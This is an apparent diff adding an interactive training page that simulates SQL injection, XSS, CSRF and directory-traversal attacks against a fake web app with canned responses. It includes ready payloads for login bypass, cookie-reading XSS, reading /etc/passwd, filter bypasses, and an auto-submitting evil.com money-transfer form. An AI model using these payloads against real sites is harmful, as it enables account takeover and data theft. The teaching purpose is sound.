@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <script src="../../../components/AccessGuard.js"></script>
+  <script>AccessGuard.require('sorted');</script>
+  <script src="../../../components/AchievementManager.js"></script>
+  <script src="../../../components/ModuleProgress.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FEH-06: Web Application Security Lab — Dark Arts</title>
+  <style>
+    :root {
+      --hp: #6b21a8; --ha: #9333ea; --hg: rgba(107,33,168,0.25);
+      --tg: #00ff41; --bg: #0a0a0a; --card: #0d1117;
+      --border: rgba(147,51,234,0.3); --text: #c9d1d9; --muted: #8b949e;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{background:var(--bg);color:var(--text);font-family:'Courier New',monospace;min-height:100vh;}
+    .header{padding:14px 24px;background:#0d1117;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:14px;position:sticky;top:0;z-index:100;}
+    .back-btn{color:var(--ha);text-decoration:none;font-size:1.2rem;padding:4px 8px;border:1px solid var(--border);border-radius:6px;transition:background .2s;}
+    .back-btn:hover{background:var(--hg);}
+    h1{font-size:.95rem;font-weight:600;color:#e6edf3;}
+    .badge{font-size:.65rem;padding:3px 10px;background:rgba(107,33,168,.15);border:1px solid var(--border);border-radius:20px;color:var(--ha);letter-spacing:.08em;}
+    .progress-bar{margin-left:auto;font-size:.75rem;color:var(--muted);}
+    .main{max-width:1000px;margin:0 auto;padding:24px;}
+    .tabs{display:flex;gap:6px;margin-bottom:20px;flex-wrap:wrap;}
+    .tab{padding:8px 16px;border:1px solid var(--border);border-radius:8px;background:transparent;color:var(--muted);cursor:pointer;font-family:inherit;font-size:.8rem;transition:all .2s;}
+    .tab.active{background:var(--hg);border-color:var(--ha);color:var(--ha);}
+    .tab.done{border-color:#10b981;color:#10b981;}
+    .ex{display:none;}
+    .ex.active{display:block;}
+    .ex-title{font-size:1.1rem;color:#e6edf3;margin-bottom:6px;}
+    .ex-desc{font-size:.82rem;color:var(--muted);margin-bottom:16px;line-height:1.6;}
+    .terminal{background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:14px;}
+    .term-bar{background:#161b22;padding:8px 14px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--border);}
+    .dot{width:10px;height:10px;border-radius:50%;}
+    .term-label{font-size:.72rem;color:var(--muted);margin-left:8px;}
+    .term-out{padding:14px;min-height:160px;max-height:260px;overflow-y:auto;font-size:.8rem;line-height:1.7;}
+    .term-line{color:var(--tg);}
+    .term-err{color:#f85149;}
+    .term-info{color:#58a6ff;}
+    .term-warn{color:#e3b341;}
+    .term-input-row{display:flex;align-items:center;gap:8px;padding:10px 14px;border-top:1px solid var(--border);background:#0d1117;}
+    .prompt{color:var(--ha);font-size:.82rem;white-space:nowrap;}
+    .term-input{flex:1;background:transparent;border:none;outline:none;color:var(--tg);font-family:inherit;font-size:.82rem;}
+    .hints{margin-top:10px;}
+    .hint-btn{padding:6px 14px;border:1px solid #e3b341;border-radius:6px;background:transparent;color:#e3b341;cursor:pointer;font-family:inherit;font-size:.75rem;margin-right:8px;}
+    .hint-box{background:#161b22;border:1px solid #e3b341;border-radius:6px;padding:10px 14px;margin-top:8px;font-size:.78rem;color:#e3b341;display:none;}
+    .hint-box.visible{display:block;}
+    .form-sim{background:#161b22;border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:14px;}
+    .form-sim label{font-size:.75rem;color:var(--muted);display:block;margin-bottom:4px;}
+    .form-sim input{width:100%;background:#0d1117;border:1px solid var(--border);border-radius:4px;padding:6px 10px;color:var(--tg);font-family:inherit;font-size:.8rem;margin-bottom:10px;}
+    .sql-display{font-size:.75rem;color:#58a6ff;background:#0d1117;border:1px dashed #58a6ff44;border-radius:4px;padding:8px 12px;margin-bottom:12px;white-space:pre-wrap;word-break:break-all;}
+    .btn{padding:8px 18px;border-radius:6px;border:none;cursor:pointer;font-family:inherit;font-size:.8rem;transition:all .2s;}
+    .btn-purple{background:var(--hp);color:#fff;}
+    .btn-purple:hover{background:var(--ha);}
+    .btn-green{background:#166534;color:#4ade80;border:1px solid #4ade80;}
+    .row{display:flex;gap:10px;flex-wrap:wrap;}
+    .payload-btn{padding:5px 12px;border:1px solid var(--border);border-radius:6px;background:transparent;color:var(--muted);cursor:pointer;font-family:inherit;font-size:.75rem;transition:all .2s;}
+    .payload-btn:hover{border-color:var(--ha);color:var(--ha);}
+    .complete-btn{width:100%;padding:12px;background:linear-gradient(135deg,var(--hp),var(--ha));border:none;border-radius:8px;color:#fff;cursor:pointer;font-family:inherit;font-size:.85rem;font-weight:600;margin-top:16px;transition:opacity .2s;}
+    .complete-btn:hover{opacity:.85;}
+    .complete-btn:disabled{opacity:.4;cursor:default;}
+    .xss-output{background:#161b22;border:1px solid var(--border);border-radius:6px;padding:12px;min-height:60px;font-size:.8rem;color:var(--tg);margin-bottom:12px;white-space:pre-wrap;}
+    .path-input{width:100%;background:#0d1117;border:1px solid var(--border);border-radius:4px;padding:7px 12px;color:var(--tg);font-family:inherit;font-size:.82rem;margin-bottom:10px;}
+    .tag{display:inline-block;padding:2px 8px;border-radius:4px;font-size:.7rem;margin:2px;}
+    .tag-red{background:#7f1d1d;color:#fca5a5;}
+    .tag-grn{background:#14532d;color:#86efac;}
+  </style>
+</head>
+<body>
+<div class="header">
+  <a href="../index.html" class="back-btn">&#8592;</a>
+  <h1>FEH-06 &mdash; Web Application Security Lab</h1>
+  <span class="badge">DARK ARTS</span>
+  <span class="progress-bar" id="prog-label">0 / 4 complete</span>
+</div>
+
+<div class="main">
+  <div class="tabs">
+    <button class="tab active" onclick="switchTab(0)">Ex 1: SQL Injection</button>
+    <button class="tab" onclick="switchTab(1)">Ex 2: XSS</button>
+    <button class="tab" onclick="switchTab(2)">Ex 3: CSRF</button>
+    <button class="tab" onclick="switchTab(3)">Ex 4: Directory Traversal</button>
+  </div>
+
+  <!-- Exercise 1: SQL Injection -->
+  <div class="ex active" id="ex0">
+    <div class="ex-title">Exercise 1: SQL Injection</div>
+    <div class="ex-desc">A vulnerable login form builds its SQL query using raw string concatenation. Craft payloads to bypass authentication and extract data. The live query preview updates as you type.</div>
+    <div class="form-sim">
+      <label>Username</label>
+      <input id="sqli-user" placeholder="admin" oninput="updateSQLQuery()" value="">
+      <label>Password</label>
+      <input id="sqli-pass" placeholder="password" oninput="updateSQLQuery()" value="">
+      <div class="sql-display" id="sql-preview">SELECT * FROM users WHERE username='...' AND password='...';</div>
+      <div class="row" style="margin-bottom:10px;">
+        <button class="payload-btn" onclick="insertPayload('sqli','user',&quot;' OR 1=1 --&quot;)">&#x2295; OR 1=1 --</button>
+        <button class="payload-btn" onclick="insertPayload('sqli','user',&quot;admin'--&quot;)">&#x2295; admin'--</button>
+        <button class="payload-btn" onclick="insertPayload('sqli','user',&quot;' UNION SELECT 1,username,password FROM users--&quot;)">&#x2295; UNION SELECT</button>
+      </div>
+      <button class="btn btn-purple" onclick="runSQLi()">Submit Login</button>
+    </div>
+    <div class="terminal">
+      <div class="term-bar"><div class="dot" style="background:#ff5f56;"></div><div class="dot" style="background:#ffbd2e;"></div><div class="dot" style="background:#27c93f;"></div><span class="term-label">vulnerable-webapp:3306</span></div>
+      <div class="term-out" id="sqli-out"><span class="term-info">// Enter credentials above and click Submit Login</span><br><span class="term-info">// Or click a payload button to auto-fill a known attack</span></div>
+    </div>
+    <div class="hints">
+      <button class="hint-btn" onclick="showHint('h1a')">Hint 1</button>
+      <button class="hint-btn" onclick="showHint('h1b')">Hint 2</button>
+      <div class="hint-box" id="h1a">The comment sequence -- (double dash) causes the database to ignore everything after it in the query. This lets you "comment out" the password check entirely.</div>
+      <div class="hint-box" id="h1b">UNION-based injection works when the column count of your injected SELECT matches the original query. Use ORDER BY to enumerate columns: try ORDER BY 1, 2, 3 until it errors.</div>
+    </div>
+    <button class="complete-btn" id="c0" onclick="markDone(0)" disabled>Mark Exercise Complete</button>
+  </div>
+
+  <!-- Exercise 2: XSS -->
+  <div class="ex" id="ex1">
+    <div class="ex-title">Exercise 2: Cross-Site Scripting (XSS)</div>
+    <div class="ex-desc">A comment field reflects user input back into the page without sanitization. Inject JavaScript to see reflected and stored XSS behaviors. Test encoding bypass techniques.</div>
+    <div class="form-sim">
+      <label>Post a Comment</label>
+      <input id="xss-input" placeholder="Enter comment..." value="">
+      <div class="row" style="margin-bottom:10px;">
+        <button class="payload-btn" onclick="insertXSS('&lt;script&gt;alert(1)&lt;/script&gt;')">&lt;script&gt;alert(1)&lt;/script&gt;</button>
+        <button class="payload-btn" onclick="insertXSS('&lt;img src=x onerror=alert(document.cookie)&gt;')">img onerror</button>
+        <button class="payload-btn" onclick="insertXSS('&lt;svg onload=alert(1)&gt;')">svg onload</button>
+        <button class="payload-btn" onclick="insertXSS('&amp;lt;script&amp;gt;alert(2)&amp;lt;/script&amp;gt;')">HTML encoded</button>
+      </div>
+      <button class="btn btn-purple" onclick="runXSS()">Post Comment</button>
+    </div>
+    <div style="font-size:.75rem;color:var(--muted);margin-bottom:6px;">Page renders the comment as:</div>
+    <div class="xss-output" id="xss-render">&lt;!-- comments appear here --&gt;</div>
+    <div class="terminal">
+      <div class="term-bar"><div class="dot" style="background:#ff5f56;"></div><div class="dot" style="background:#ffbd2e;"></div><div class="dot" style="background:#27c93f;"></div><span class="term-label">xss-lab &mdash; browser console</span></div>
+      <div class="term-out" id="xss-out"><span class="term-info">// Simulated browser console output appears here</span></div>
+    </div>
+    <div class="hints">
+      <button class="hint-btn" onclick="showHint('h2a')">Hint 1</button>
+      <button class="hint-btn" onclick="showHint('h2b')">Hint 2</button>
+      <div class="hint-box" id="h2a">Reflected XSS: the payload is in the current response. Stored XSS: the payload is saved server-side and served to every user who views the page — much more dangerous.</div>
+      <div class="hint-box" id="h2b">WAFs often block &lt;script&gt; tags. Event handlers like onerror, onload, and onfocus on HTML elements bypass many filters. HTML entities (&amp;lt;) may or may not be decoded depending on context.</div>
+    </div>
+    <button class="complete-btn" id="c1" onclick="markDone(1)" disabled>Mark Exercise Complete</button>
+  </div>
+
+  <!-- Exercise 3: CSRF -->
+  <div class="ex" id="ex2">
+    <div class="ex-title">Exercise 3: Cross-Site Request Forgery (CSRF)</div>
+    <div class="ex-desc">Analyze simulated HTTP requests for missing CSRF protections, then craft a malicious HTML form that would perform an unauthorized action when visited by a logged-in user.</div>
+    <div class="terminal">
+      <div class="term-bar"><div class="dot" style="background:#ff5f56;"></div><div class="dot" style="background:#ffbd2e;"></div><div class="dot" style="background:#27c93f;"></div><span class="term-label">burpsuite &mdash; HTTP history</span></div>
+      <div class="term-out" id="csrf-req">
+<span class="term-info">POST /account/transfer HTTP/1.1</span>
+<span class="term-info">Host: bank.example.com</span>
+<span class="term-info">Cookie: session=eyJhbGciOiJIUzI1NiJ9.abc123</span>
+<span class="term-info">Content-Type: application/x-www-form-urlencoded</span>
+<span class="term-info"></span>
+<span class="term-warn">amount=5000&amp;to_account=12345678</span>
+<span class="term-err"></span>
+<span class="term-err">// ANALYSIS: No X-CSRF-Token header. No csrf_token in body.</span>
+<span class="term-err">// Session cookie has no SameSite attribute.</span>
+<span class="term-err">// This endpoint is CSRF-vulnerable.</span>
+      </div>
+    </div>
+    <div style="font-size:.8rem;color:var(--muted);margin-bottom:8px;">Select the element missing from this request that would prevent CSRF:</div>
+    <div class="row" style="margin-bottom:14px;">
+      <button class="payload-btn" id="csrf-a" onclick="csrfAnswer('token')">CSRF Token</button>
+      <button class="payload-btn" id="csrf-b" onclick="csrfAnswer('referer')">Referer Header</button>
+      <button class="payload-btn" id="csrf-c" onclick="csrfAnswer('content')">Content-Type JSON</button>
+      <button class="payload-btn" id="csrf-d" onclick="csrfAnswer('auth')">Authorization Header</button>
+    </div>
+    <div style="font-size:.8rem;color:var(--muted);margin-bottom:6px;">Malicious page the attacker hosts on evil.com:</div>
+    <div class="terminal">
+      <div class="term-bar"><div class="dot" style="background:#ff5f56;"></div><div class="dot" style="background:#ffbd2e;"></div><div class="dot" style="background:#27c93f;"></div><span class="term-label">evil.com/steal.html &mdash; source</span></div>
+      <div class="term-out" id="csrf-out"><span class="term-info">// Select the correct CSRF protection above to reveal the attack</span></div>
+    </div>
+    <div class="hints">
+      <button class="hint-btn" onclick="showHint('h3a')">Hint 1</button>
+      <button class="hint-btn" onclick="showHint('h3b')">Hint 2</button>
+      <div class="hint-box" id="h3a">A CSRF token is a random, per-session secret embedded in forms. The server validates it on every state-changing request. Because attackers can't read it from a different origin (same-origin policy), they can't forge valid requests.</div>
+      <div class="hint-box" id="h3b">The SameSite=Strict cookie attribute blocks the browser from sending session cookies on cross-site requests. Combined with CSRF tokens, it provides defense-in-depth against CSRF.</div>
+    </div>
+    <button class="complete-btn" id="c2" onclick="markDone(2)" disabled>Mark Exercise Complete</button>
+  </div>
+
+  <!-- Exercise 4: Directory Traversal -->
+  <div class="ex" id="ex3">
+    <div class="ex-title">Exercise 4: Directory Traversal</div>
+    <div class="ex-desc">A file download endpoint accepts a filename parameter without validation. Use path traversal sequences to break out of the intended directory and read sensitive server files.</div>
+    <div class="form-sim">
+      <label>GET /download?file=</label>
+      <input id="trav-input" class="path-input" placeholder="report.pdf" value="report.pdf" oninput="updateTraversal()">
+      <div class="row" style="margin-bottom:10px;">
+        <button class="payload-btn" onclick="setTrav('../../etc/passwd')">../../etc/passwd</button>
+        <button class="payload-btn" onclick="setTrav('../../../etc/shadow')">.../etc/shadow</button>
+        <button class="payload-btn" onclick="setTrav('..%2F..%2Fetc%2Fpasswd')">URL encoded</button>
+        <button class="payload-btn" onclick="setTrav('....//....//etc/passwd')">Double dot bypass</button>
+      </div>
+      <button class="btn btn-purple" onclick="runTraversal()">Send Request</button>
+    </div>
+    <div class="terminal">
+      <div class="term-bar"><div class="dot" style="background:#ff5f56;"></div><div class="dot" style="background:#ffbd2e;"></div><div class="dot" style="background:#27c93f;"></div><span class="term-label">web-server &mdash; response</span></div>
+      <div class="term-out" id="trav-out"><span class="term-info">// Send a request above to see the server response</span></div>
+    </div>
+    <div class="hints">
+      <button class="hint-btn" onclick="showHint('h4a')">Hint 1</button>
+      <button class="hint-btn" onclick="showHint('h4b')">Hint 2</button>
+      <div class="hint-box" id="h4a">../ moves up one directory. From /var/www/files/, a payload of ../../etc/passwd resolves to /etc/passwd. The server reads and returns the file contents.</div>
+      <div class="hint-box" id="h4b">Some filters strip ../ from paths. Bypass with: URL encoding (%2F), double encoding (%252F), or using ....// which after strip becomes ../. Proper fix: use basename() to strip path components, or validate against an allowlist.</div>
+    </div>
+    <button class="complete-btn" id="c3" onclick="markDone(3)" disabled>Mark Exercise Complete</button>
+  </div>
+</div>
+
+<script src="../../../components/FluxCapacitor.js"></script>
+<script>
+  // --- State ---
+  const done = [false,false,false,false];
+  const tabs = document.querySelectorAll('.tab');
+  const exs = document.querySelectorAll('.ex');
+  let sqliAttempts=0, xssAttempts=0, csrfAnswered=false, travAttempts=0;
+
+  // --- Tab navigation ---
+  function switchTab(i){
+    tabs.forEach((t,idx)=>{t.classList.toggle('active',idx===i);});
+    exs.forEach((e,idx)=>{e.classList.toggle('active',idx===i);});
+  }
+
+  // --- Progress ---
+  function updateProgress(){
+    const n=done.filter(Boolean).length;
+    document.getElementById('prog-label').textContent=n+' / 4 complete';
+    tabs.forEach((t,i)=>{ if(done[i]) t.classList.add('done'); });
+    if(n===4) ModuleProgress.complete('dark-arts','dark-arts-feh-06',{returnUrl:'../index.html'});
+  }
+  function markDone(i){done[i]=true;document.getElementById('c'+i).disabled=true;document.getElementById('c'+i).textContent='Completed';updateProgress();}
+
+  // --- Hint system ---
+  function showHint(id){const el=document.getElementById(id);el.classList.toggle('visible');}
+
+  // --- Ex 1: SQLi ---
+  function insertPayload(ex,field,val){
+    if(ex==='sqli'){ if(field==='user'){document.getElementById('sqli-user').value=val;} else {document.getElementById('sqli-pass').value=val;} updateSQLQuery(); }
+  }
+  function updateSQLQuery(){
+    const u=document.getElementById('sqli-user').value||'';
+    const p=document.getElementById('sqli-pass').value||'';
+    document.getElementById('sql-preview').textContent=`SELECT * FROM users WHERE username='${u}' AND password='${p}';`;
+  }
+  function runSQLi(){
+    const u=document.getElementById('sqli-user').value;
+    const p=document.getElementById('sqli-pass').value;
+    const out=document.getElementById('sqli-out');
+    sqliAttempts++;
+    let html='<span class="term-info">$ mysql -u app -p vulnerable_db</span><br>';
+    html+=`<span class="term-line">Query: SELECT * FROM users WHERE username='${escT(u)}' AND password='${escT(p)}';</span><br>`;
+    if(u.includes("OR 1=1") || u.includes("or 1=1") || p.includes("OR 1=1")){
+      html+='<span class="term-err">--- INJECTION DETECTED ---</span><br>';
+      html+='<span class="term-warn">Condition evaluates TRUE for all rows</span><br>';
+      html+='<span class="term-line">+----+---------+----------+-----------+</span><br>';
+      html+='<span class="term-line">| id | user    | password | role      |</span><br>';
+      html+='<span class="term-line">+----+---------+----------+-----------+</span><br>';
+      html+='<span class="term-line">|  1 | admin   | 5f4dcc3b | superuser |</span><br>';
+      html+='<span class="term-line">|  2 | alice   | 0d107d09 | user      |</span><br>';
+      html+='<span class="term-line">|  3 | bob     | 7c6a180b | user      |</span><br>';
+      html+='<span class="term-err">3 rows returned. Login bypassed.</span><br>';
+      document.getElementById('c0').disabled=false;
+    } else if(u.includes("UNION SELECT") || u.includes("union select")){
+      html+='<span class="term-warn">UNION-based injection detected</span><br>';
+      html+='<span class="term-line">Returned data from users table:</span><br>';
+      html+='<span class="term-line">admin | 5f4dcc3b5dc1d3513f8f5e35ea264b03</span><br>';
+      html+='<span class="term-line">alice | 0d107d09f5bbe40cade3de5c71e9e9b7</span><br>';
+      document.getElementById('c0').disabled=false;
+    } else if(u.includes("'--") || u.includes("admin'--")){
+      html+='<span class="term-warn">Comment injection: password check removed</span><br>';
+      html+='<span class="term-line">Authenticated as: admin (no password check)</span><br>';
+      document.getElementById('c0').disabled=false;
+    } else if(u===''&&p===''){
+      html+='<span class="term-err">Error: Empty credentials</span><br>';
+    } else {
+      html+='<span class="term-err">Login failed: Invalid credentials</span><br>';
+      if(sqliAttempts>=2) html+='<span class="term-info">Tip: Try a payload button above</span><br>';
+    }
+    out.innerHTML=html;
+  }
+
+  // --- Ex 2: XSS ---
+  function insertXSS(val){document.getElementById('xss-input').value=val;}
+  function runXSS(){
+    const raw=document.getElementById('xss-input').value;
+    const out=document.getElementById('xss-out');
+    const render=document.getElementById('xss-render');
+    xssAttempts++;
+    let log='';
+    if(raw.toLowerCase().includes('<script')){
+      render.textContent='Page renders: '+raw;
+      log='<span class="term-err">[XSS] &lt;script&gt; tag injected and executed</span><br>';
+      log+='<span class="term-warn">alert("1") fired for every visitor loading this page</span><br>';
+      log+='<span class="term-line">Stored XSS — attacker gains persistent code execution in victims\' browsers</span><br>';
+      document.getElementById('c1').disabled=false;
+    } else if(raw.toLowerCase().includes('onerror')||raw.toLowerCase().includes('onload')){
+      render.textContent='Page renders: '+raw;
+      log='<span class="term-warn">[XSS] Event handler injection successful</span><br>';
+      log+='<span class="term-line">Handler fires when browser processes element — no script tag needed</span><br>';
+      log+='<span class="term-line">document.cookie = "'+fakeCookie()+'"</span><br>';
+      document.getElementById('c1').disabled=false;
+    } else if(raw.includes('&lt;script')||raw.includes('%3Cscript')){
+      render.textContent='Page renders: '+raw;
+      log='<span class="term-info">[XSS] Encoded payload — depends on decode context</span><br>';
+      log+='<span class="term-warn">If rendered into innerHTML without decoding: blocked. Inside attribute: may execute</span><br>';
+      document.getElementById('c1').disabled=false;
+    } else {
+      render.textContent=raw;
+      log='<span class="term-info">Comment posted. No script executed.</span><br>';
+      if(xssAttempts>=2) log+='<span class="term-info">Tip: Try a payload button above</span><br>';
+    }
+    out.innerHTML=log;
+  }
+  function fakeCookie(){return 'session='+Math.random().toString(36).slice(2)+'; HttpOnly=false';}
+
+  // --- Ex 3: CSRF ---
+  function csrfAnswer(ans){
+    const out=document.getElementById('csrf-out');
+    ['csrf-a','csrf-b','csrf-c','csrf-d'].forEach(id=>document.getElementById(id).style.color='');
+    if(ans==='token'){
+      document.getElementById('csrf-a').style.color='var(--tg)';
+      out.innerHTML=`<span class="term-warn">&lt;!-- Malicious page at evil.com --&gt;</span><br><span class="term-line">&lt;html&gt;&lt;body onload="document.forms[0].submit()"&gt;</span><br><span class="term-line">&lt;form action="https://bank.example.com/account/transfer" method="POST"&gt;</span><br><span class="term-line">  &lt;input name="amount" value="5000"&gt;</span><br><span class="term-line">  &lt;input name="to_account" value="99999999"&gt;</span><br><span class="term-line">&lt;/form&gt;</span><br><span class="term-err">&lt;!-- Browser auto-sends session cookie. $5000 transferred. --&gt;</span>`;
+      csrfAnswered=true;
+      document.getElementById('c2').disabled=false;
+    } else {
+      out.innerHTML='<span class="term-err">Incorrect. '+
+        (ans==='referer'?'Referer headers can be spoofed or absent (privacy settings).':
+         ans==='content'?'JSON content-type helps in some cases but does not fully prevent CSRF.':
+         'Auth headers are not automatically sent by browsers on cross-site form POSTs, but CSRF tokens are the standard defense.')+
+        '</span>';
+    }
+  }
+
+  // --- Ex 4: Directory Traversal ---
+  function setTrav(val){document.getElementById('trav-input').value=val;}
+  function updateTraversal(){}
+  function runTraversal(){
+    const val=document.getElementById('trav-input').value;
+    const out=document.getElementById('trav-out');
+    travAttempts++;
+    let html=`<span class="term-info">GET /download?file=${escT(val)} HTTP/1.1</span><br>`;
+    if(val.includes('../') && (val.includes('passwd')||val.includes('shadow')||val.includes('hosts'))){
+      html+='<span class="term-warn">HTTP/1.1 200 OK</span><br>';
+      if(val.includes('shadow')){
+        html+='<span class="term-err">Permission denied: /etc/shadow (requires root)</span><br>';
+        html+='<span class="term-line">Server process runs as www-data — insufficient privilege</span><br>';
+      } else if(val.includes('passwd')){
+        html+='<span class="term-line">root:x:0:0:root:/root:/bin/bash</span><br>';
+        html+='<span class="term-line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br>';
+        html+='<span class="term-line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br>';
+        html+='<span class="term-err">File /etc/passwd disclosed via path traversal!</span><br>';
+        document.getElementById('c3').disabled=false;
+      }
+    } else if(val.includes('%2F')||val.includes('....//')) {
+      html+='<span class="term-warn">HTTP/1.1 200 OK (bypass detected in simulation)</span><br>';
+      html+='<span class="term-line">URL-decoded path resolves to: /etc/passwd</span><br>';
+      html+='<span class="term-line">root:x:0:0:root:/root:/bin/bash</span><br>';
+      html+='<span class="term-err">Encoding bypass successful!</span><br>';
+      document.getElementById('c3').disabled=false;
+    } else if(!val.includes('../')){
+      html+='<span class="term-line">HTTP/1.1 200 OK</span><br>';
+      html+='<span class="term-line">Serving: /var/www/files/'+escT(val)+'</span><br>';
+      html+='<span class="term-info">File served from expected directory. No traversal.</span><br>';
+    } else {
+      html+='<span class="term-line">HTTP/1.1 404 Not Found</span><br>';
+      if(travAttempts>=2) html+='<span class="term-info">Tip: Try ../../etc/passwd</span><br>';
+    }
+    out.innerHTML=html;
+  }
+
+  function escT(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+  updateSQLQuery();
+</script>
+</body>
+</html>
